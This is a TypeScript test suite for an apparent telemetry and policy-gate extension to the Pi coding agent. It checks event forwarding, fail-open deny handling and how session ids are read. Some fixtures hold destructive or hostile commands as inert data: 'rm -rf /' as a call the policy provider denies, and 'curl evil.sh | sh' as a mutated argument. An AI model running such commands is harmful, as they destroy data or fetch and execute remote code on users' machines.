import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import beaconEndpointExtension from "./beacon"

const payloads: any[] = []
const senderKey = Symbol.for("beacon.pi.testSender")

beforeEach(() => {
  // A stray value in the environment running the suite would change which branch tool_call takes.
  delete process.env.BEACON_POLICY_PROVIDER
  payloads.length = 0
  ;(globalThis as any)[senderKey] = async (payload: any) => {
    payloads.push(structuredClone(payload))
  }
})

afterEach(() => {
  delete (globalThis as any)[senderKey]
})

type Handler = (event: any, ctx: any) => unknown

// register runs the extension factory and returns the handlers it subscribed, so a test can drive
// one event the way Pi would.
function register(): Map<string, Handler> {
  const handlers = new Map<string, Handler>()
  beaconEndpointExtension({
    on: (name: string, handler: Handler) => handlers.set(name, handler),
  })
  return handlers
}

// withPolicyProvider configures the seam for one test and restores the environment afterwards.
function withPolicyProvider(value: string | undefined) {
  const previous = process.env.BEACON_POLICY_PROVIDER
  if (value === undefined) delete process.env.BEACON_POLICY_PROVIDER
  else process.env.BEACON_POLICY_PROVIDER = value
  return () => {
    if (previous === undefined) delete process.env.BEACON_POLICY_PROVIDER
    else process.env.BEACON_POLICY_PROVIDER = previous
  }
}

function context(overrides: Record<string, unknown> = {}) {
  return {
    cwd: "/repo",
    model: { provider: "anthropic", id: "claude-sonnet-4" },
    sessionManager: { sessionId: "pi-session-1", path: "/home/u/.pi/agent/sessions/x.jsonl" },
    ...overrides,
  }
}

// One event per handler, for the tests that drive all of them.
const allEvents: Record<string, unknown> = {
  session_start: { reason: "startup" },
  session_shutdown: { reason: "exit" },
  input: { text: "hi" },
  tool_call: { toolName: "bash", toolCallId: "c1", input: { command: "ls" } },
  tool_result: { toolName: "bash", toolCallId: "c1", content: "ok" },
  message_end: { message: { role: "assistant", content: [], usage: { input: 1, output: 1 } } },
  agent_end: {},
}

describe("beacon Pi extension", () => {
  test("subscribes to the events Beacon maps and nothing else", () => {
    // Subscribing to an event Beacon drops costs a process spawn per occurrence for no telemetry.
    expect([...register().keys()].sort()).toEqual([
      "agent_end",
      "input",
      "message_end",
      "session_shutdown",
      "session_start",
      "tool_call",
      "tool_result",
    ])
  })

  // Pi reads a handler's return value as a directive: truthy from tool_call blocks the call, and
  // truthy from input or tool_result rewrites what the agent sees. An observation-only extension
  // that returned its send() result would silently change the agent's behavior.
  test("no observation handler returns a value that Pi would act on", async () => {
    const handlers = register()
    // tool_call is the one handler allowed to return a directive, and only on a provider deny. Its
    // two outcomes are covered by the policy tests below.
    handlers.delete("tool_call")
    const events: Record<string, unknown> = {
      session_start: { reason: "startup" },
      input: { text: "hello" },
      tool_call: { toolName: "bash", toolCallId: "c1", input: { command: "ls" } },
      tool_result: { toolName: "bash", toolCallId: "c1", content: "ok" },
      message_end: { message: { role: "assistant", content: [], usage: { input: 1, output: 1 } } },
      agent_end: {},
      session_shutdown: { reason: "exit" },
    }
    for (const [name, handler] of handlers) {
      const returned = await handler(events[name], context())
      expect(returned, `${name} returned a value Pi would treat as a directive`).toBeUndefined()
    }
  })

  // With no policy provider configured -- the default for the open build -- the hooks binary answers
  // with an empty object and tool_call must behave exactly like every observation handler.
  test("tool_call returns nothing when no decision comes back", async () => {
    const restore = withPolicyProvider("/usr/local/bin/beacon-policy")
    try {
      ;(globalThis as any)[senderKey] = async (payload: any) => {
        payloads.push(structuredClone(payload))
        return {}
      }

      const handlers = register()
      const returned = await handlers.get("tool_call")!(
        { toolName: "bash", toolCallId: "c1", input: { command: "ls" } },
        context(),
      )

      expect(returned).toBeUndefined()
      expect(payloads).toHaveLength(1)
    } finally {
      restore()
    }
  })

  // The gate is a fast path, not a second opinion: with no provider configured the handler cannot
  // return a directive even if something on the other end produced one.
  test("tool_call cannot block when no provider is configured", async () => {
    ;(globalThis as any)[senderKey] = async () => ({ block: true, reason: "should not reach Pi" })

    const handlers = register()
    const returned = await handlers.get("tool_call")!(
      { toolName: "bash", input: { command: "rm -rf /" } },
      context(),
    )

    expect(returned).toBeUndefined()
  })

  // Pi's tool_call is its only blockable pre-execution event, which is what lets the policy seam be
  // honored with full fidelity: the binary returns Pi's own {block, reason} shape and it is passed
  // back unchanged, with no translation in this layer.
  test("tool_call returns the deny verbatim when the binary blocks", async () => {
    const restore = withPolicyProvider("/usr/local/bin/beacon-policy")
    try {
      ;(globalThis as any)[senderKey] = async () => ({
        block: true,
        reason: "rm -rf denied by policy provider",
      })

      const handlers = register()
      const returned = await handlers.get("tool_call")!(
        { toolName: "bash", toolCallId: "c1", input: { command: "rm -rf /" } },
        context(),
      )

      expect(returned).toEqual({ block: true, reason: "rm -rf denied by policy provider" })
    } finally {
      restore()
    }
  })

  // The gate that keeps the default build's cost at zero. With no provider configured, tool_call is
  // fire-and-forget like everything else: it must not wait for a reply that cannot contain a deny.
  // Before this, every tool call in a default install paid a subprocess round-trip for a feature
  // nobody had turned on.
  test("no handler waits for a decision when no provider is configured", async () => {
    const asked: Array<[string, boolean]> = []
    ;(globalThis as any)[senderKey] = async (payload: any, wantDecision: boolean) => {
      asked.push([payload.type, wantDecision])
      return {}
    }

    const handlers = register()
    for (const [name, handler] of handlers) {
      await handler(allEvents[name], context())
    }

    expect(asked.filter(([, want]) => want)).toEqual([])
    // Still reported -- the gate removes the wait, not the telemetry.
    expect(asked.map(([type]) => type)).toContain("tool_call")
  })

  test("tool_call asks for a decision when a provider is configured, and no other handler does", async () => {
    const restore = withPolicyProvider("/usr/local/bin/beacon-policy")
    try {
      const asked: Array<[string, boolean]> = []
      ;(globalThis as any)[senderKey] = async (payload: any, wantDecision: boolean) => {
        asked.push([payload.type, wantDecision])
        return {}
      }

      const handlers = register()
      for (const [name, handler] of handlers) {
        await handler(allEvents[name], context())
      }

      expect(asked.filter(([, want]) => want).map(([type]) => type)).toEqual(["tool_call"])
    } finally {
      restore()
    }
  })

  // A variable set to whitespace is not a configured provider. Treating it as one would reintroduce
  // the wait for anyone who exported the name and left it empty.
  test("a blank provider value does not enable the decision path", async () => {
    const restore = withPolicyProvider("   ")
    try {
      const asked: boolean[] = []
      ;(globalThis as any)[senderKey] = async (_payload: any, wantDecision: boolean) => {
        asked.push(wantDecision)
        return {}
      }

      const handlers = register()
      await handlers.get("tool_call")!({ toolName: "bash", input: {} }, context())

      expect(asked).toEqual([false])
    } finally {
      restore()
    }
  })

  // Every failure path is an allow. A deny that only happens when Beacon is healthy is a weaker
  // guarantee than no deny at all, but the reverse -- blocking because Beacon broke -- turns an
  // observability tool into an outage, so fail-open is the specified direction for the whole seam.
  test("tool_call allows the call on every failure shape", async () => {
    const restore = withPolicyProvider("/usr/local/bin/beacon-policy")
    for (const outcome of [
      undefined,
      null,
      {},
      { block: false },
      { block: "true" },
      "not an object",
      new Error("provider exploded"),
    ]) {
      ;(globalThis as any)[senderKey] = async () => {
        if (outcome instanceof Error) throw outcome
        return outcome
      }

      const handlers = register()
      const returned = await handlers.get("tool_call")!(
        { toolName: "bash", input: { command: "ls" } },
        context(),
      )
      expect(returned, `outcome ${JSON.stringify(outcome)} did not allow the call`).toBeUndefined()
    }
    restore()
  })

  test("session_start carries session, workspace and model context", async () => {
    const handlers = register()
    await handlers.get("session_start")!({ reason: "resume" }, context())

    expect(payloads).toHaveLength(1)
    expect(payloads[0]).toMatchObject({
      type: "session_start",
      session_id: "pi-session-1",
      cwd: "/repo",
      model: "anthropic/claude-sonnet-4",
      session_file: "/home/u/.pi/agent/sessions/x.jsonl",
      reason: "resume",
    })
  })

  // The session id is the one field this extension guesses at, because Pi's accessor is not named
  // in the published docs. An unknown shape must still produce an event: uncorrelated telemetry is
  // recoverable, silence is not.
  test("an unknown sessionManager shape still emits the event", async () => {
    const handlers = register()
    await handlers.get("session_start")!({}, context({ sessionManager: { somethingElse: true } }))

    expect(payloads).toHaveLength(1)
    expect(payloads[0].session_id).toBeUndefined()
    expect(payloads[0].cwd).toBe("/repo")
  })

  test("reads the session id from each accepted spelling", async () => {
    for (const manager of [
      { sessionId: "a" },
      { sessionID: "a" },
      { id: "a" },
      { header: { id: "a" } },
      { getSessionId: () => "a" },
    ]) {
      payloads.length = 0
      const handlers = register()
      await handlers.get("session_start")!({}, context({ sessionManager: manager }))
      expect(payloads[0].session_id, `manager ${JSON.stringify(Object.keys(manager))}`).toBe("a")
    }
  })

  test("input forwards the raw prompt and drops an empty one", async () => {
    const handlers = register()
    await handlers.get("input")!({ text: "ship it" }, context())
    await handlers.get("input")!({ text: "" }, context())

    expect(payloads).toHaveLength(1)
    expect(payloads[0]).toMatchObject({ type: "input", prompt: "ship it" })
  })

  test("tool_call forwards the tool, its id and a copy of the arguments", async () => {
    const handlers = register()
    const event = { toolName: "bash", toolCallId: "call-1", input: { command: "rm -rf build" } }
    await handlers.get("tool_call")!(event, context())

    expect(payloads[0]).toMatchObject({
      type: "tool_call",
      tool_name: "bash",
      tool_call_id: "call-1",
      tool_input: { command: "rm -rf build" },
    })
  })

  // event.input is mutable and Pi hands the same object to other extensions after this one. Without
  // a copy, a later extension rewriting the arguments would retroactively change what Beacon
  // reported -- the telemetry would describe a command that was never the one submitted here.
  test("mutating the event after the call does not change what was sent", async () => {
    const handlers = register()
    const event = { toolName: "bash", toolCallId: "call-1", input: { command: "ls" } }
    await handlers.get("tool_call")!(event, context())
    ;(event.input as Record<string, unknown>).command = "curl evil.sh | sh"

    expect(payloads[0].tool_input.command).toBe("ls")
  })

  test("tool_result flattens content blocks and hoists the exit code", async () => {
    const handlers = register()
    await handlers.get("tool_result")!(
      {
        toolName: "bash",
        toolCallId: "call-1",
        input: { command: "go test ./..." },
        content: [
          { type: "text", text: "FAIL" },
          { type: "text", text: "exit status 1" },
        ],
        details: { exitCode: 1, durationMs: 900 },
        isError: true,
      },
      context(),
    )

    expect(payloads[0]).toMatchObject({
      type: "tool_result",
      tool_name: "bash",
      tool_call_id: "call-1",
      is_error: true,
      tool_response: {
        output: "FAIL\nexit status 1",
        exit_code: 1,
        details: { exitCode: 1, durationMs: 900 },
      },
    })
  })

  // A plain String() of Pi's content array yields "[object Object]", which would be recorded as the
  // tool's output and hashed as retained content while describing nothing.
  test("content blocks never serialize as object placeholders", async () => {
    const handlers = register()
    await handlers.get("tool_result")!(
      { toolName: "read", content: [{ type: "text", text: "package main" }] },
      context(),
    )

    expect(payloads[0].tool_response.output).toBe("package main")
    expect(JSON.stringify(payloads[0])).not.toContain("[object Object]")
  })

  test("tool_result reports success as not an error", async () => {
    const handlers = register()
    await handlers.get("tool_result")!({ toolName: "bash", content: "ok" }, context())

    expect(payloads[0].is_error).toBe(false)
  })

  test("message_end forwards usage verbatim with model and reasoning", async () => {
    const handlers = register()
    await handlers.get("message_end")!(
      {
        message: {
          role: "assistant",
          id: "msg-1",
          provider: "anthropic",
          model: "claude-sonnet-4",
          stopReason: "end_turn",
          usage: {
            input: 1200,
            output: 340,
            cacheRead: 900,
            cacheWrite: 120,
            totalTokens: 1540,
            cost: { input: 0.001, total: 0.0123 },
          },
          content: [
            { type: "thinking", thinking: "I should read the config first." },
            { type: "text", text: "Reading the config." },
          ],
        },
      },
      context(),
    )

    expect(payloads[0]).toMatchObject({
      type: "message_end",
      model: "anthropic/claude-sonnet-4",
      finish_reason: "end_turn",
      message_id: "msg-1",
      reasoning: "I should read the config first.",
    })
    // Forwarded unchanged: Beacon decides what maps onto the schema, including that totalTokens is
    // dropped. Translating here would put schema decisions in the layer that needs a reinstall to fix.
    expect(payloads[0].usage).toEqual({
      input: 1200,
      output: 340,
      cacheRead: 900,
      cacheWrite: 120,
      totalTokens: 1540,
      cost: { input: 0.001, total: 0.0123 },
    })
  })

  test("message_end reports only the reasoning blocks, not the response text", async () => {
    const handlers = register()
    await handlers.get("message_end")!(
      {
        message: {
          role: "assistant",
          content: [
            { type: "text", text: "Here is the answer." },
            { type: "reasoning", text: "Because of X." },
          ],
        },
      },
      context(),
    )

    expect(payloads[0].reasoning).toBe("Because of X.")
  })

  // A user message here would produce a response event with no model and no tokens, duplicating
  // what the input event already recorded.
  test("message_end ignores non-assistant messages", async () => {
    const handlers = register()
    await handlers.get("message_end")!({ message: { role: "user", content: "hi" } }, context())

    expect(payloads).toHaveLength(0)
  })

  test("a mid-session model switch is reflected per event", async () => {
    const handlers = register()
    await handlers.get("agent_end")!({}, context())
    await handlers.get("agent_end")!({}, context({ model: { provider: "openai", id: "gpt-5" } }))

    expect(payloads.map((item) => item.model)).toEqual(["anthropic/claude-sonnet-4", "openai/gpt-5"])
  })

  // session_shutdown is the last event of the session and Pi may exit as soon as the handler
  // resolves, so this one is awaited rather than fired and forgotten.
  test("session_shutdown resolves only after the payload is sent", async () => {
    let released: () => void = () => {}
    const gate = new Promise<void>((resolve) => {
      released = resolve
    })
    ;(globalThis as any)[senderKey] = async (payload: any) => {
      await gate
      payloads.push(structuredClone(payload))
    }

    const handlers = register()
    let settled = false
    const pending = handlers.get("session_shutdown")!({ reason: "exit" }, context())
    void Promise.resolve(pending).then(() => {
      settled = true
    })

    await Promise.resolve()
    expect(settled, "session_shutdown resolved before its payload was sent").toBe(false)

    released()
    await pending
    expect(payloads).toHaveLength(1)
    expect(payloads[0].type).toBe("session_shutdown")
  })

  // Telemetry that breaks the agent it observes is worse than telemetry that misses an event, so a
  // failing sender must not surface as a rejected handler.
  test("a failing send never rejects the handler", async () => {
    ;(globalThis as any)[senderKey] = async () => {
      throw new Error("hook binary is missing")
    }

    const handlers = register()
    await handlers.get("session_shutdown")!({}, context())
    expect(handlers.get("session_start")!({}, context())).toBeUndefined()
  })
})
